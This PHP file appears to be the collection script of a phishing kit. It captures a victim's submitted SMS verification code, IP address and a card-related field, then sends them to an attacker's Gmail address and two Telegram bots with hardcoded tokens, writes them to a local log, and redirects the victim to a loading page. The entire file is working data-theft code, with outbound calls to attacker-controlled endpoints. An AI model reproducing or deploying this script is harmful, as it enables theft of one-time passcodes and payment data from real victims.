<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________xxx_____________\n";

$message .= "__________________SMS 2_____________\n";
$message .= "sms two          : ".$_POST['sms2']."\n";
$message .= "_________| pegasus  |__________\n";

$subject = "CC INFO| ".$_POST['CC']." | $ip ";
$headers = "From:orsted ";
$email = ".$EX445093_REMOT.";
mail($email,$subject,$message,$headers);
$EX445093_REMOT = "msi1msi2msi3msi4@gmail.com";
$file = fopen('Flow.txt', 'a');

fwrite($file,$message);

function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5060947787:AAGdkyVVaESjaagNRwNwv02ReQcP-76q0sQ';
    $chat_id  = '-521845462';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send(urlencode($message));


function telegram_send1($message) {
    $curl = curl_init();
    $api_key  = '2103271885:AA566565FELgaOBF6E8lpStNvwlr_A0QxtMKkqo2w';
    $chat_id  = '-72255143654972';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send1(urlencode($message));

header("Location: loading.html");

?>